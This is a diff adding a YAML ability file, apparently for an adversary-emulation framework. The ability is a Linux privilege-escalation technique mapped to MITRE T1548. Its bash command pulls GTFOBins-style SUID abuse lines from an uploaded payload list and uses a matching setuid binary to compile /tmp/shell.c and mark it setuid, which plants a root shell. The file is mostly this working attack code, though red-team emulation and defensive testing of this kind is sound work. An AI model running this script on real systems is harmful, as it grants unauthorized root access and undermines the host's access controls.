@@ -1,0 +1,27 @@
+id: 59110299-7a6c-4f66-a1a1-3fe755f3cd76
+name: Create Elevated Binary
+description: Create elevated binary using the pre-existing suid binary.
+tactic: privilege-escalation
+technique:
+  id: T1548
+  name: Abuse Elevation Control Mechanism
+platforms:
+  linux:
+    bash:
+      command: |-
+        mv payload.txt /tmp/payload.txt
+        eval "suidGTFO=($(cat /tmp/payload.txt | tr '\n' ' '))"
+        for ((suid = 0; suid < ${#suidGTFO[@]}; suid++));do
+            if [[ "${suidGTFO[$suid]}" == *"#{json.T1548.suid}"* ]]; then
+                echo "gcc -o /tmp/shell /tmp/shell.c" | eval ${suidGTFO[$suid]}
+                echo "chmod +s /tmp/shell" | eval ${suidGTFO[$suid]}
+            fi
+            done;
+      payload: '#{operator.payloads}/uploads/payload.txt'
+metadata:
+  authors:
+    - gerbsec
+  tags:
+    - SUID GTFOBINS
+  themes: []
+  enabled: true
